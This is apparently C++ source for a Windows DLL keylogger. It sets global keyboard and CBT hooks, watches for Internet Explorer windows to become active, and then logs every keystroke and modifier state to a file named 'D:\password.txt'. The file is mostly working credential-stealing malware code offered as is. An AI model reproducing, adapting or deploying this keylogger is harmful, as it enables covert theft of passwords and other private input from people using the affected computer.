// KDLL.cpp : 定义 DLL 应用程序的导出函数。
//
#include "stdafx.h"
#include "KDLL.h"

#define	CHARNUM		5
#define	TXTLENGTH	10
#define	PLACEOFFILE	"D:\\password.txt"

extern HINSTANCE hInst;
static	BOOL	bHooked = FALSE;
static	BOOL	IE_is_active = FALSE;
static	HHOOK	hhook = 0, hhookMsg = 0;
static HINSTANCE hInst;
int count;
static char	tomb[CHARNUM];
static FILE *stream;
static int shift = 32;
short  flag;

enum NUM	//枚举几个特殊功能键
{
	SHIFT,
	CONTROL,
	ALT,
	CAPITAL
};


static int	condition[CHARNUM][CAPITAL + 1];
static TCHAR text[TXTLENGTH];



LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam);

// 这是导出变量的一个示例
int nKDLL=0;



// 这是导出函数的一个示例。
INT _stdcall fnAdd(int a, int b)
{
	return  a + b;
}






void _stdcall fnSetKbHook(void)
{
	if (!bHooked)
	{
		hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
		hhookMsg = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL);
		bHooked = TRUE;
		MessageBox(GetDesktopWindow(), L"HOOKED!", L"info", MB_OK);
	}
}

void _stdcall fnRemoveKbHook(void)
{
	if (bHooked)
		UnhookWindowsHookEx(hhook);
		MessageBox(GetDesktopWindow(), L"UNHOOKED!", L"info", MB_OK);

}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) //键盘消息处理的回调函数
{

	int i, temp;
	int flag_shift;
	int flag_capital;
	int flag_alt;
	int flag_control;

	if (IE_is_active)
	{
		if ((wParam == VK_SHIFT) || (wParam == VK_CAPITAL) || (wParam == VK_MENU) || (wParam == VK_CONTROL))
		{
			flag_shift = 0x8000 & GetKeyState(VK_SHIFT);
			flag_capital = 0x0001 & GetKeyState(VK_CAPITAL);
			flag_alt = 0x8000 & GetKeyState(VK_MENU);
			flag_control = 0x8000 & GetKeyState(VK_CONTROL);
		}
		if (wParam != VK_TAB && wParam != VK_ESCAPE && wParam != VK_LEFT && wParam != VK_RIGHT &&
			wParam != VK_UP && wParam != VK_DOWN && wParam != VK_END && wParam != VK_HOME &&
			wParam != VK_PRIOR && wParam != VK_NEXT && wParam != VK_INSERT && wParam != VK_NUMLOCK &&
			wParam != VK_SCROLL && wParam != VK_PAUSE && wParam != VK_LWIN && wParam != VK_RWIN &&
			wParam != VK_F1 && wParam != VK_F2 && wParam != VK_F3 && wParam != VK_F4 && wParam != VK_F5 &&
			wParam != VK_F6 && wParam != VK_F7 && wParam != VK_F8 && wParam != VK_F9 &&wParam != VK_F10 &&
			wParam != VK_F11 && wParam != VK_F12)
		{
			if ((0x80000000 & lParam) == 0)	//WM_KEYDOWN?
			{
				if (wParam >= 0x41 && wParam <= 0x5a)
					wParam += 32;					 //Kisbeture konvertalas
				if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
				{
					if (wParam == VK_CAPITAL)
						temp = 1;
					else temp = 0;
					condition[count][wParam - 16 - temp] = 1;
				}
				tomb[count] = wParam;
				count++;
			}
			else								//WM_KEYUP?
				if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
				{
					if (wParam == VK_CAPITAL)
						temp = 1;
					else temp = 0;
					condition[count][wParam - 16 - temp] = 2;
					tomb[count] = wParam;
					count++;
				}
			if (count == CHARNUM)
			{
				stream = fopen(PLACEOFFILE, "a+");

				for (i = 0; i < count; i++)
				{
					switch (tomb[i])
					{
					case VK_DELETE:
						fprintf(stream, "%s", "<d>");
						break;

					case VK_RETURN:
						fprintf(stream, "%s", "\n");
						break;

					case VK_BACK:
						fprintf(stream, "%s", "<b>");
						break;

					case VK_SHIFT:
						if (condition[i][SHIFT] == 1)
							fprintf(stream, "%s", "<sd>");
						else
							fprintf(stream, "%s", "<su>");
						break;

					case VK_CONTROL:
						if (condition[i][CONTROL] == 1)
							fprintf(stream, "%s", "<ctd>");
						else
							fprintf(stream, "%s", "<ctu>");
						break;

					case VK_MENU:
						if (condition[i][ALT] == 1)
							fprintf(stream, "%s", "<ad>");
						else
							fprintf(stream, "%s", "<au>");
						break;

					case VK_CAPITAL:
						if (condition[i][CAPITAL] == 1)
							fprintf(stream, "%s", "<cpd>");
						else
							fprintf(stream, "%s", "<cpu>");
						break;

					default:
						fprintf(stream, "%c", tomb[i]);
						break;
					}
				}
				fclose(stream);
				count = 0;
				initCondition();
			}
		}
	}
	return CallNextHookEx(hhook, code, wParam, lParam);
}

void initCondition(void)
{
	int i, j;
	for (i = 0; i < CHARNUM; i++)
		for (j = 0; j < CAPITAL + 1; j++)
			condition[i][j] = 0;
}

LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_ACTIVATE)
	{
		GetClassName((HWND)wParam, text, TXTLENGTH);
		if (text[0] == 'I' && text[1] == 'E')	//Class name of Internet-Explorer begins with IE
			IE_is_active = TRUE;
		else
			IE_is_active = FALSE;
	}

	return CallNextHookEx(hhookMsg, code, wParam, lParam);
}
